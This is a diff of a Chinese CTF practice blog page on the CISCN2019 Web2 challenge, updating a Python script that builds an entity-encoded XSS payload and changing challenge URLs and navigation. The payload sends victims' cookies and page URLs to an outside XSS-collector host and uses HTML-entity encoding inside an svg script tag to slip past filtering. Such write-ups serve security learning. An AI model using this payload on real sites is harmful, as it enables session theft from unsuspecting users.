@@ -554,7 +554,7 @@
 <p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210821224003146.png"></p>
 <p>然后使用<a target="_blank" rel="noopener" href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html">HTML Markup</a>进行转码绕过</p>
 <p><code>(new Image()).src</code>改为<code>window.location.href</code></p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token triple-quoted-string string">'''(function()&#123;window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=3aODbl&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return ''&#125;&#125;)());&#125;)();'''</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token triple-quoted-string string">'''(function()&#123;window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=gHkxCN&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return ''&#125;&#125;)());&#125;)();'''</span>
 output <span class="token operator">=</span> <span class="token string">""</span>
 
 <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">:</span>
@@ -562,22 +562,23 @@ output <span class="token operator">=</span> <span class="token string">""</span
 
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;svg>&lt;script>eval&amp;#40&amp;#34"</span> <span class="token operator">+</span> output <span class="token operator">+</span> <span class="token string">"&amp;#34&amp;#41&lt;/script>"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<pre class="line-numbers language-none"><code class="language-none">&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#61&amp;#39&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#120&amp;#115&amp;#115&amp;#46&amp;#98&amp;#117&amp;#117&amp;#111&amp;#106&amp;#46&amp;#99&amp;#110&amp;#47&amp;#105&amp;#110&amp;#100&amp;#101&amp;#120&amp;#46&amp;#112&amp;#104&amp;#112&amp;#63&amp;#100&amp;#111&amp;#61&amp;#97&amp;#112&amp;#105&amp;#38&amp;#105&amp;#100&amp;#61&amp;#51&amp;#97&amp;#79&amp;#68&amp;#98&amp;#108&amp;#38&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#61&amp;#39&amp;#43&amp;#101&amp;#115&amp;#99&amp;#97&amp;#112&amp;#101&amp;#40&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#116&amp;#114&amp;#121&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#125&amp;#99&amp;#97&amp;#116&amp;#99&amp;#104&amp;#40&amp;#101&amp;#41&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#39&amp;#39&amp;#125&amp;#125&amp;#41&amp;#40&amp;#41&amp;#41&amp;#43&amp;#39&amp;#38&amp;#116&amp;#111&amp;#112&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#61&amp;#39&amp;#43&amp;#101&amp;#115&amp;#99&amp;#97&amp;#112&amp;#101&amp;#40&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#116&amp;#114&amp;#121&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#116&amp;#111&amp;#112&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#125&amp;#99&amp;#97&amp;#116&amp;#99&amp;#104&amp;#40&amp;#101&amp;#41&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#39&amp;#39&amp;#125&amp;#125&amp;#41&amp;#40&amp;#41&amp;#41&amp;#43&amp;#39&amp;#38&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#61&amp;#39&amp;#43&amp;#101&amp;#115&amp;#99&amp;#97&amp;#112&amp;#101&amp;#40&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#116&amp;#114&amp;#121&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#125&amp;#99&amp;#97&amp;#116&amp;#99&amp;#104&amp;#40&amp;#101&amp;#41&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#39&amp;#39&amp;#125&amp;#125&amp;#41&amp;#40&amp;#41&amp;#41&amp;#43&amp;#39&amp;#38&amp;#111&amp;#112&amp;#101&amp;#110&amp;#101&amp;#114&amp;#61&amp;#39&amp;#43&amp;#101&amp;#115&amp;#99&amp;#97&amp;#112&amp;#101&amp;#40&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#116&amp;#114&amp;#121&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#40&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#101&amp;#114&amp;#32&amp;#38&amp;#38&amp;#32&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#101&amp;#114&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#41&amp;#63&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#101&amp;#114&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#58&amp;#39&amp;#39&amp;#125&amp;#99&amp;#97&amp;#116&amp;#99&amp;#104&amp;#40&amp;#101&amp;#41&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#39&amp;#39&amp;#125&amp;#125&amp;#41&amp;#40&amp;#41&amp;#41&amp;#59&amp;#125&amp;#41&amp;#40&amp;#41&amp;#59&amp;#34&amp;#41&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#61&amp;#39&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#120&amp;#115&amp;#115&amp;#46&amp;#98&amp;#117&amp;#117&amp;#111&amp;#106&amp;#46&amp;#99&amp;#110&amp;#47&amp;#105&amp;#110&amp;#100&amp;#101&amp;#120&amp;#46&amp;#112&amp;#104&amp;#112&amp;#63&amp;#100&amp;#111&amp;#61&amp;#97&amp;#112&amp;#105&amp;#38&amp;#105&amp;#100&amp;#61&amp;#103&amp;#72&amp;#107&amp;#120&amp;#67&amp;#78&amp;#38&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#61&amp;#39&amp;#43&amp;#101&amp;#115&amp;#99&amp;#97&amp;#112&amp;#101&amp;#40&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#116&amp;#114&amp;#121&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#125&amp;#99&amp;#97&amp;#116&amp;#99&amp;#104&amp;#40&amp;#101&amp;#41&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#39&amp;#39&amp;#125&amp;#125&amp;#41&amp;#40&amp;#41&amp;#41&amp;#43&amp;#39&amp;#38&amp;#116&amp;#111&amp;#112&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#61&amp;#39&amp;#43&amp;#101&amp;#115&amp;#99&amp;#97&amp;#112&amp;#101&amp;#40&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#116&amp;#114&amp;#121&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#116&amp;#111&amp;#112&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#125&amp;#99&amp;#97&amp;#116&amp;#99&amp;#104&amp;#40&amp;#101&amp;#41&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#39&amp;#39&amp;#125&amp;#125&amp;#41&amp;#40&amp;#41&amp;#41&amp;#43&amp;#39&amp;#38&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#61&amp;#39&amp;#43&amp;#101&amp;#115&amp;#99&amp;#97&amp;#112&amp;#101&amp;#40&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#116&amp;#114&amp;#121&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#125&amp;#99&amp;#97&amp;#116&amp;#99&amp;#104&amp;#40&amp;#101&amp;#41&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#39&amp;#39&amp;#125&amp;#125&amp;#41&amp;#40&amp;#41&amp;#41&amp;#43&amp;#39&amp;#38&amp;#111&amp;#112&amp;#101&amp;#110&amp;#101&amp;#114&amp;#61&amp;#39&amp;#43&amp;#101&amp;#115&amp;#99&amp;#97&amp;#112&amp;#101&amp;#40&amp;#40&amp;#102&amp;#117&amp;#110&amp;#99&amp;#116&amp;#105&amp;#111&amp;#110&amp;#40&amp;#41&amp;#123&amp;#116&amp;#114&amp;#121&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#40&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#101&amp;#114&amp;#32&amp;#38&amp;#38&amp;#32&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#101&amp;#114&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#41&amp;#63&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#101&amp;#114&amp;#46&amp;#108&amp;#111&amp;#99&amp;#97&amp;#116&amp;#105&amp;#111&amp;#110&amp;#46&amp;#104&amp;#114&amp;#101&amp;#102&amp;#58&amp;#39&amp;#39&amp;#125&amp;#99&amp;#97&amp;#116&amp;#99&amp;#104&amp;#40&amp;#101&amp;#41&amp;#123&amp;#114&amp;#101&amp;#116&amp;#117&amp;#114&amp;#110&amp;#32&amp;#39&amp;#39&amp;#125&amp;#125&amp;#41&amp;#40&amp;#41&amp;#41&amp;#59&amp;#125&amp;#41&amp;#40&amp;#41&amp;#59&amp;#34&amp;#41&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
 <p>生成的payload打进去，发现页面自动跳转，说明有效</p>
 <p>页面地址</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;8e1806d5-e036-490a-a56c-ce3004d985fd.node4.buuoj.cn&#x2F;post&#x2F;6e64d66582c98f1e9ca5ea5a12ab11c2.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;3ab0873a-a1d0-455d-a996-07620bdb753e.node4.buuoj.cn:81&#x2F;post&#x2F;3eb90a2d54bdfadfcfafe59834b8e26a.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>需要改为</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;web.node4.buuoj.cn&#x2F;post&#x2F;6e64d66582c98f1e9ca5ea5a12ab11c2.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;web.node4.buuoj.cn:81&#x2F;post&#x2F;3eb90a2d54bdfadfcfafe59834b8e26a.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>放到这里，然后跑一下md5</p>
 <p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210821224622133.png"></p>
 <p>之前单线程脚本太慢了，写了个多线程的脚本跑。</p>
 <p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA-Web2/image-20210822004536074.png"></p>
 <p>试了很久，xss都没触发，累了，明天再做吧</p>
+<p>第二天又试了下，还是不行，无语了。</p>
 
                 
             </div>
@@ -693,18 +694,17 @@ output <span class="token operator">=</span> <span class="token string">""</span
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/p/563486977.html">
+                <a href="/p/1884635343.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/70.jpg" class="responsive-img" alt="刷题笔记:[CISCN2019 华东北赛区]Web2">
+                        <img src="/medias/featureimages/38.jpg" class="responsive-img" alt="刷题笔记:[FireshellCTF2020]Caas">
                         
-                        <span class="card-title">刷题笔记:[CISCN2019 华东北赛区]Web2</span>
+                        <span class="card-title">刷题笔记:[FireshellCTF2020]Caas</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -714,9 +714,9 @@ output <span class="token operator">=</span> <span class="token string">""</span
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-21
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-22
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -729,7 +729,6 @@ output <span class="token operator">=</span> <span class="token string">""</span
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
